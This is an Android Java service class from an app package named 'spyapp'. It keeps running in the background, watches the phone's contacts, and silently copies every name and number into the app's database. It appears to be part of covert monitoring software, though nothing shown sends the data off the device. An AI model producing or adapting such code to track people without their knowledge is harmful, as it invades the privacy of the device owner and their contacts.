package com.app.spyapp.service;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.text.TextUtils;
import android.util.Log;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.WriteLog;
import com.app.spyapp.model.ContactModel;

import java.util.ArrayList;


public class ContactAddService extends Service {

    private ContentResolver contentResolver;
    private SpyApp spyApp;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        spyApp = (SpyApp) getApplicationContext();
    }

    public void registerObserver() {
        this.getApplicationContext().getContentResolver().registerContentObserver(ContactsContract.Contacts.CONTENT_URI, true, new MyContactContentObserver());

    }

    //start the service and register observer for lifetime
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        registerObserver();

        return START_STICKY;
    }

    private class MyContactContentObserver extends ContentObserver {

        public MyContactContentObserver() {
            super(null);
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            Log.i(ContactAddService.class.getSimpleName(), " Start.........");
            ArrayList<ContactModel> contactList = getContactList();
            if (contactList != null && contactList.size() > 0) {
                for (int i = 0; i < contactList.size(); i++) {
                    ContactModel contactModel = contactList.get(i);
                    if (!TextUtils.isEmpty(contactModel.getNumber())) {
                        if (spyApp.getDatabaseHelper().isContactAvailable(contactModel.getContactId())) {
                            ContactModel model = spyApp.getDatabaseHelper().getContactInfo(contactModel.getContactId());
                            if (model != null) {
                                if (!model.getName().equalsIgnoreCase(contactModel.getName()) || !model.getNumber().equalsIgnoreCase(contactModel.getNumber())) {
                                    spyApp.getDatabaseHelper().updateContact(contactModel);
                                }
                            }
                        } else {
                            spyApp.getDatabaseHelper().insertContact(contactModel);
                        }
                    }
                }
            }
            Log.i(ContactAddService.class.getSimpleName(), " Stop.........");
        }

        @Override
        public boolean deliverSelfNotifications() {
            return true;
        }
    }

    // get contactBackup

    private ArrayList<ContactModel> getContactList() {
        ArrayList<ContactModel> contactList = new ArrayList<>();
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                ContactModel contactModel = new ContactModel();
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));
                contactModel.setContactId(id);
                contactModel.setName(name);
                if (Integer.parseInt(cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        contactModel.setNumber(phoneNo);
                    }
                    pCur.close();
                }
                contactList.add(contactModel);
            }
        }
        return contactList;
    }
}
